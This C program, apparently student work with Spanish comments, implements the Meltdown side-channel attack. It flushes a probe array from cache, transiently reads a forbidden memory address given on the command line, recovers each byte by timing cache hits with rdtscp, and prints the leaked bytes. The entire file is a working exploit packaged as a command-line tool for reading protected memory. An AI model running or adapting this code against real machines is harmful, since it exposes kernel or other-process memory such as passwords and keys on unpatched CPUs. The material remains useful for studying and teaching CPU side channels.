// Autores: Ruben Castelar e Iker Gonzalez
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h> // Para _mm_clflush, __rdtscp

#define CACHE_HIT_THRESHOLD 80
#define PROBE_ARRAY_SIZE (256 * 4096)

static sigjmp_buf env;
static uint8_t probe_array[PROBE_ARRAY_SIZE];
static uint8_t leaked_value = 0; // Valor filtrado

void segfault_handler(int signum) {
    siglongjmp(env, 1);
}

// Configra el manejador de señales para capturar fallos de segmentacion (SIGSEGV) sin detener el programa
void setup_signal_handler() {
    signal(SIGSEGV, segfault_handler);
}

// Función para leer el contador de tiempo (RDTSC)
uint64_t rdtsc() {
    unsigned int aux;
    return __rdtscp(&aux);
}

// Esta es la función principal que realiza el ataque de Meltdown
void meltdown_attack(uint8_t *address, uint8_t *probe_array) { // Se le pasa la dirección a la que acceder y el canal lateral
    setup_signal_handler(); // Instala el handler

    while (1) {
        // 1. Vaciar el probe_array de la caché
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_array[i * 4096]);
        }

        _mm_mfence(); // Asegura el orden de instrucciones

        // 2. Intentar leer desde dirección no permitida
        if (sigsetjmp(env, 1) == 0) {
            // Acceso ilegal (será interrumpido por SIGSEGV)
            uint8_t value = *address;

            // Usa el valor como índice en el canal lateral
            volatile uint8_t temp = probe_array[value * 4096];
        }

        // 3. Identificar qué valor quedó cacheado (acceso más rápido = filtrado)
        for (int i = 0; i < 256; i++) {
            uint64_t t1 = rdtsc();
            volatile uint8_t dummy = probe_array[i * 4096];
            uint64_t t2 = rdtsc() - t1;

            if (t2 < CACHE_HIT_THRESHOLD) {
                leaked_value = (uint8_t)i;
                return;
            }
        }
    }
}

// Función principal: recibe dirección secreta y número de bytes a leer
int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Uso: %s <dirección en hex> <num_bytes>\n", argv[0]);
        return 1;
    }

    uint8_t *secret = (uint8_t *)strtoull(argv[1], NULL, 16);
    int num_bytes = atoi(argv[2]);

    printf("[+] Leyendo %d bytes desde %p...\n", num_bytes, secret);

    for (int i = 0; i < num_bytes; i++) {
        meltdown_attack(secret + i, probe_array);
        printf("0x%02x (%c)\n", leaked_value, (leaked_value >= 32 && leaked_value <= 126) ? leaked_value : '.');
    }

    return 0;
}

